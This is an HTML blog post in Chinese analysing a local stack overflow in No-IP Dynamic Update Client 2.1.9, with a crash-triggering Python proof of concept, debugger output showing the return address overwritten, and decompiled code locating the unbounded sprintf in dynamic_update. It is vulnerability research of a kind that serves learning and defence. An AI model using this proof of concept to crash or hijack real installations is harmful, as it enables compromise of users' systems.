@@ -1,0 +1,947 @@
+<!DOCTYPE html>
+
+
+
+
+<html class="theme-next muse" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="漏洞分析,溢出,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="giantbranch's blog" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="环境 gdb + peda + pwndbgubuntu 16.04  分析poc（exp可以查看底部链接，不过那个exp不好使，因为好像便宜不对，而且返回地址是写死的） 1234567import osbinary = &amp;quot;./noip2-i686&amp;quot;print &amp;quot;[*] Executing %s ...&amp;quot; % (binary)os.system(&amp;quot;">
+<meta name="keywords" content="漏洞分析,溢出">
+<meta property="og:type" content="article">
+<meta property="og:title" content="No-IP Dynamic Update Client (DUC) 2.1.9 - Local IP Address Stack Overflow 漏洞简析">
+<meta property="og:url" content="https://www.giantbranch.cn/2019/01/08/No-IP Dynamic Update Client (DUC) 2.1.9 - Local IP Address Stack Overflow 漏洞简析/index.html">
+<meta property="og:site_name" content="giantbranch&#39;s blog">
+<meta property="og:description" content="环境 gdb + peda + pwndbgubuntu 16.04  分析poc（exp可以查看底部链接，不过那个exp不好使，因为好像便宜不对，而且返回地址是写死的） 1234567import osbinary = &amp;quot;./noip2-i686&amp;quot;print &amp;quot;[*] Executing %s ...&amp;quot; % (binary)os.system(&amp;quot;">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2023-10-13T13:14:33.054Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="No-IP Dynamic Update Client (DUC) 2.1.9 - Local IP Address Stack Overflow 漏洞简析">
+<meta name="twitter:description" content="环境 gdb + peda + pwndbgubuntu 16.04  分析poc（exp可以查看底部链接，不过那个exp不好使，因为好像便宜不对，而且返回地址是写死的） 1234567import osbinary = &amp;quot;./noip2-i686&amp;quot;print &amp;quot;[*] Executing %s ...&amp;quot; % (binary)os.system(&amp;quot;">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://www.giantbranch.cn/2019/01/08/No-IP Dynamic Update Client (DUC) 2.1.9 - Local IP Address Stack Overflow 漏洞简析/">
+
+
+
+
+
+  <title>No-IP Dynamic Update Client (DUC) 2.1.9 - Local IP Address Stack Overflow 漏洞简析 | giantbranch's blog</title>
+  
+
+
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-121265336-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?e3a097ddc6964e154e65d478725ac9ed";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">giantbranch's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description">忘掉掌声，按自己的方式，继续前行，跑过一生</h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-book">
+          <a href="/book/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-book"></i> <br>
+            
+            读过的书
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-sitemap">
+          <a href="/sitemap.xml" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>
+            
+            站点地图
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://www.giantbranch.cn/2019/01/08/No-IP Dynamic Update Client (DUC) 2.1.9 - Local IP Address Stack Overflow 漏洞简析/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="giantbranch">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="giantbranch's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">No-IP Dynamic Update Client (DUC) 2.1.9 - Local IP Address Stack Overflow 漏洞简析</h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-01-08T00:00:00+00:00">
+                2019-01-08
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2019/01/08/No-IP Dynamic Update Client (DUC) 2.1.9 - Local IP Address Stack Overflow 漏洞简析/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2019/01/08/No-IP Dynamic Update Client (DUC) 2.1.9 - Local IP Address Stack Overflow 漏洞简析/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><blockquote>
+<p>gdb + peda + pwndbg<br>ubuntu 16.04</p>
+</blockquote>
+<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>poc（exp可以查看底部链接，不过那个exp不好使，因为好像便宜不对，而且返回地址是写死的）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line"></span><br><span class="line">binary = &quot;./noip2-i686&quot;</span><br><span class="line"></span><br><span class="line">print &quot;[*] Executing %s ...&quot; % (binary)</span><br><span class="line"></span><br><span class="line">os.system(&quot;%s -i %s&quot; % (binary, &quot;A&quot; * 500))</span><br></pre></td></tr></table></figure>
+
+<p>直接运行会报错，缺少<code>/usr/local/etc/no-ip2.conf</code>文件，查看文档，可以看到-C可以新建</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">$ ./noip2-i686 -h</span><br><span class="line"></span><br><span class="line">USAGE: noip2-i686 [ -C [ -F][ -Y][ -U #min]</span><br><span class="line">	[ -u username][ -p password][ -x progname]]</span><br><span class="line">	[ -c file][ -d][ -D pid][ -i addr][ -S][ -M][ -h]</span><br><span class="line"></span><br><span class="line">Version Linux-2.1.9</span><br><span class="line">Options: -C               create configuration data</span><br><span class="line">         -F               force NAT off</span><br><span class="line">         -Y               select all hosts/groups</span><br><span class="line">         -U minutes       set update interval</span><br><span class="line">         -u username      use supplied username</span><br><span class="line">         -p password      use supplied password</span><br><span class="line">         -x executable    use supplied executable</span><br><span class="line">         -c config_file   use alternate data path</span><br><span class="line">         -d               increase debug verbosity</span><br><span class="line">         -D processID     toggle debug flag for PID</span><br><span class="line">         -i IPaddress     use supplied address</span><br><span class="line">         -I interface     use supplied interface</span><br><span class="line">         -S               show configuration data</span><br><span class="line">         -M               permit multiple instances</span><br><span class="line">         -K processID     terminate instance PID</span><br><span class="line">         -z               activate shm dump code</span><br><span class="line">         -h               help (this text)</span><br><span class="line">$ sudo ./noip2-i686 -C</span><br><span class="line"></span><br><span class="line">Auto configuration for Linux client of no-ip.com.</span><br><span class="line"></span><br><span class="line">Please enter the login/email string for no-ip.com  XXX@XXX.com</span><br><span class="line">Please enter the password for user &apos;XXX@XXX.com&apos;  ***************</span><br><span class="line"></span><br><span class="line">Only one host [XXXXX.ddns.net] is registered to this account.</span><br><span class="line">It will be used.</span><br><span class="line">Please enter an update interval:[30]  </span><br><span class="line">Do you wish to run something at successful update?[N] (y/N)  ^M</span><br><span class="line"></span><br><span class="line">New configuration file &apos;/usr/local/etc/no-ip2.conf&apos; created.</span><br><span class="line">$ sudo chmod 777 /usr/local/etc/no-ip2.conf</span><br></pre></td></tr></table></figure>
+
+<p>通过exploit-db的信息，我们知道漏洞在-i处</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ r -i `python -c &quot;print &apos;A&apos;*500&quot;`</span><br><span class="line">Starting program: /home/giantbranch/tmp/noip/noip-2.1.9-1/binaries/noip2-i686 -i `python -c &quot;print &apos;A&apos;*500&quot;`</span><br><span class="line">IP address detected on command line.</span><br><span class="line">Running in single use mode.</span><br><span class="line">IP address &apos;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">Use the NAT facility.</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line"></span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0x41414141 (&apos;AAAA&apos;)</span><br><span class="line">EBX: 0x0 </span><br><span class="line">ECX: 0xffffffff </span><br><span class="line">EDX: 0xf7fb8864 --&gt; 0x0 </span><br><span class="line">ESI: 0xf7fb7000 --&gt; 0x1b1db0 </span><br><span class="line">EDI: 0xf7fb7000 --&gt; 0x1b1db0 </span><br><span class="line">EBP: 0x41414141 (&apos;AAAA&apos;)</span><br><span class="line">ESP: 0xffffd350 (&apos;A&apos; &lt;repeats 15 times&gt;...)</span><br><span class="line">EIP: 0x41414141 (&apos;AAAA&apos;)</span><br><span class="line">EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">Invalid $PC address: 0x41414141</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffd350 (&apos;A&apos; &lt;repeats 15 times&gt;...)</span><br><span class="line">0004| 0xffffd354 (&apos;A&apos; &lt;repeats 15 times&gt;...)</span><br><span class="line">0008| 0xffffd358 (&apos;A&apos; &lt;repeats 15 times&gt;...)</span><br><span class="line">0012| 0xffffd35c (&apos;A&apos; &lt;repeats 15 times&gt;...)</span><br><span class="line">0016| 0xffffd360 (&apos;A&apos; &lt;repeats 15 times&gt;...)</span><br><span class="line">0020| 0xffffd364 (&apos;A&apos; &lt;repeats 15 times&gt;...)</span><br><span class="line">0024| 0xffffd368 (&apos;A&apos; &lt;repeats 15 times&gt;...)</span><br><span class="line">0028| 0xffffd36c (&apos;A&apos; &lt;repeats 15 times&gt;...)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">Stopped reason: SIGSEGV</span><br><span class="line">0x41414141 in ?? ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">──────────────────────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────────────────────</span><br><span class="line"> EAX  0x41414141 (&apos;AAAA&apos;)</span><br><span class="line"> EBX  0x0</span><br><span class="line"> ECX  0xffffffff</span><br><span class="line"> EDX  0xf7fb8864 (_IO_stdfile_2_lock) ◂— 0</span><br><span class="line"> EDI  0xf7fb7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x1d /* 0x1b1db0 */</span><br><span class="line"> ESI  0xf7fb7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x1d /* 0x1b1db0 */</span><br><span class="line"> EBP  0x41414141 (&apos;AAAA&apos;)</span><br><span class="line"> ESP  0xffffd350 ◂— 0x41414141 (&apos;AAAA&apos;)</span><br><span class="line"> EIP  0x41414141 (&apos;AAAA&apos;)</span><br><span class="line">───────────────────────────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────────────────────────</span><br><span class="line">Invalid address 0x41414141</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────</span><br><span class="line">00:0000│ esp  0xffffd350 ◂— 0x41414141 (&apos;AAAA&apos;)</span><br><span class="line">... ↓</span><br><span class="line">──────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────</span><br><span class="line"> ► f 0 41414141</span><br><span class="line">   f 1 41414141</span><br><span class="line">   f 2 41414141</span><br><span class="line">   f 3 41414141</span><br><span class="line">   f 4 41414141</span><br><span class="line">   f 5 41414141</span><br><span class="line">   f 6 41414141</span><br><span class="line">   f 7 41414141</span><br><span class="line">   f 8 41414141</span><br><span class="line">   f 9 41414141</span><br><span class="line">   f 10 41414141</span><br><span class="line">Program received signal SIGSEGV (fault address 0x41414141)</span><br></pre></td></tr></table></figure>
+
+<p>输出的看到最后一行是Use the NAT facility.，我们IDA找一下，是在handle_dynup_error函数里面，发现这里只是输出</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">case 27:</span><br><span class="line">  Msg(&quot;IP address &apos;%s&apos; is a private network address.&quot;, (unsigned int)&amp;IPaddress);</span><br><span class="line">  Msg(&quot;Use the NAT facility.&quot;, v2);</span><br><span class="line">  goto LABEL_26;</span><br></pre></td></tr></table></figure>
+
+<p>但是调用这个的有很多，不好确定是哪个，我们再看上一个字符串<code>Recovering dead process 111467 shmem slot</code>，发现是在<code>get_shm_info</code>函数里面</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">for ( i = 0; i &lt;= 3; ++i )</span><br><span class="line">&#123;</span><br><span class="line">v13 = shared + 504 * i;</span><br><span class="line">if ( !*(_DWORD *)(shared + 504 * i) )</span><br><span class="line">&#123;</span><br><span class="line">  my_instance = shared + 504 * i;</span><br><span class="line">  break;</span><br><span class="line">&#125;</span><br><span class="line">if ( !strcmp((const char *)(v13 + 24), config_filename) )</span><br><span class="line">&#123;</span><br><span class="line">  if ( kill(*(_DWORD *)v13, 0) == -1 &amp;&amp; *__errno_location() == 3 )</span><br><span class="line">  &#123;</span><br><span class="line">    Msg(&quot;Recovering dead process %d shmem slot&quot;, *(_DWORD *)v13);</span><br><span class="line">    my_instance = v13;</span><br><span class="line">    break;</span><br><span class="line">  &#125;</span><br><span class="line">  if ( background || !IPaddress )</span><br><span class="line">  &#123;</span><br><span class="line">    Msg(&quot;Configuration &apos;%s&apos; already in use&quot;, v13 + 24);</span><br><span class="line">    Msg(&quot;by process %d.  Ending!&quot;, *(_DWORD *)v13);</span><br><span class="line">    shmdt(shmaddr);</span><br><span class="line">    shared = 0;</span><br><span class="line">    return -1;</span><br><span class="line">  &#125;</span><br><span class="line">  strncpy((char *)(v13 + 8), &amp;IPaddress, 0x10u);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在<code>Msg(&quot;Recovering dead process %d shmem slot&quot;, *(_DWORD *)v13);</code>处下断点，栈数据没有被破坏，所以这还没到漏洞点，这时已经回到main函数了</p>
+<p>只剩后面这些代码了，由于IPaddress我们指定了，所以肯定不为0 ，进入的是第二个if，那么下面这些函数没看出什么漏洞，那么漏洞应该在dynamic_update里面</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">if ( get_shm_info() != -1 )</span><br><span class="line">&#123;</span><br><span class="line">  if ( !IPaddress )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( nat )</span><br><span class="line">      get_our_visible_IPaddr(&amp;IPaddress);</span><br><span class="line">    else</span><br><span class="line">      getip(&amp;IPaddress, device);</span><br><span class="line">  &#125;</span><br><span class="line">  if ( IPaddress )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( dynamic_update() == 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      strncpy((char *)(my_instance + 8), &amp;IPaddress, 0x10u);</span><br><span class="line">      goto LABEL_31;</span><br><span class="line">    &#125;</span><br><span class="line">    *(_DWORD *)my_instance = 0;</span><br><span class="line">    shmdt(shmaddr);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    Msg(&quot;Not connected to Net!&quot;, v7);</span><br><span class="line">    *(_DWORD *)my_instance = 0;</span><br><span class="line">    shmdt(shmaddr);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们执行到<code>call dynamic_update</code>，ni就蹦了，IDA查看这个函数，很快就可以看到这个漏洞点了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sprintf(&amp;s, &quot;&amp;ip=%s&quot;, &amp;IPaddress);</span><br></pre></td></tr></table></figure>
+
+<p>我们调试确认一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">  0x804c032 &lt;dynamic_update+79&gt;     call   bdecode &lt;0x804e989&gt;</span><br><span class="line"></span><br><span class="line">  0x804c037 &lt;dynamic_update+84&gt;     mov    dword ptr [esp + 8], IPaddress &lt;0x80573bc&gt;</span><br><span class="line">  0x804c03f &lt;dynamic_update+92&gt;     mov    dword ptr [esp + 4], 0x804fd8d</span><br><span class="line">  0x804c047 &lt;dynamic_update+100&gt;    lea    eax, [ebp - 0x128]</span><br><span class="line">  0x804c04d &lt;dynamic_update+106&gt;    mov    dword ptr [esp], eax</span><br><span class="line">► 0x804c050 &lt;dynamic_update+109&gt;    call   sprintf@plt &lt;0x8049348&gt;</span><br><span class="line">       s: 0xffffd2e0 —▸ 0xf7fd2018 ◂— 0x7273752f (&apos;/usr&apos;)</span><br><span class="line">       format: 0x804fd8d ◂— &apos;&amp;ip=%s&apos;</span><br><span class="line">       vararg: 0x80573bc (IPaddress) ◂— 0x41414141 (&apos;AAAA&apos;)</span><br><span class="line"></span><br><span class="line">  0x804c055 &lt;dynamic_update+114&gt;    lea    eax, [ebp - 0x128]</span><br><span class="line">  0x804c05b &lt;dynamic_update+120&gt;    mov    dword ptr [esp + 4], eax</span><br><span class="line">  0x804c05f &lt;dynamic_update+124&gt;    mov    dword ptr [esp], buffer &lt;0x8053020&gt;</span><br><span class="line">  0x804c066 &lt;dynamic_update+131&gt;    call   strcat@plt &lt;0x80491f8&gt;</span><br><span class="line"></span><br><span class="line">  0x804c06b &lt;dynamic_update+136&gt;    mov    dword ptr [ebp - 0x24], buffer+8192 &lt;0x8055020&gt;</span><br></pre></td></tr></table></figure>
+
+<p>我们再看看IPaddress的位置</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">db-peda$ x /76wx 0x80573bc</span><br><span class="line">0x80573bc &lt;IPaddress&gt;:	0x41414141	0x41414141	0x41414141	0x41414141</span><br><span class="line">0x80573cc:	0x41414141	0x41414141	0x41414141	0x41414141</span><br><span class="line">0x80573dc:	0x41414141	0x41414141	0x41414141	0x41414141</span><br><span class="line">0x80573ec:	0x41414141	0x41414141	0x41414141	0x41414141</span><br><span class="line">0x80573fc:	0x41414141	0x41414141	0x41414141	0x41414141</span><br><span class="line">0x805740c:	0x41414141	0x41414141	0x41414141	0x41414141</span><br><span class="line">0x805741c:	0x41414141	0x41414141	0x41414141	0x41414141</span><br><span class="line">0x805742c:	0x41414141	0x41414141	0x41414141	0x41414141</span><br><span class="line">0x805743c:	0x41414141	0x41414141	0x41414141	0x41414141</span><br><span class="line">0x805744c:	0x41414141	0x41414141	0x41414141	0x41414141</span><br><span class="line">0x805745c:	0x41414141	0x41414141	0x41414141	0x41414141</span><br><span class="line">0x805746c:	0x41414141	0x41414141	0x41414141	0x41414141</span><br><span class="line">0x805747c:	0x41414141	0x41414141	0x41414141	0x41414141</span><br><span class="line">0x805748c:	0x41414141	0x41414141	0x41414141	0x41414141</span><br><span class="line">0x805749c:	0x41414141	0x41414141	0x41414141	0x41414141</span><br><span class="line">0x80574ac:	0x41414141	0x41414141	0x41414141	0x41414141</span><br><span class="line">0x80574bc:	0x41414141	0x41414141	0x41414141	0x41414141</span><br><span class="line">0x80574cc:	0x41414141	0x41414141	0x41414141	0x41414141</span><br><span class="line">0x80574dc:	0x41414141	0x41414141	0x41414141	0x00000000</span><br></pre></td></tr></table></figure>
+
+<p>可以看到确实是sprintf的时候溢出的，我们不断单步到ret，确实返回地址被覆盖成0x41414141了</p>
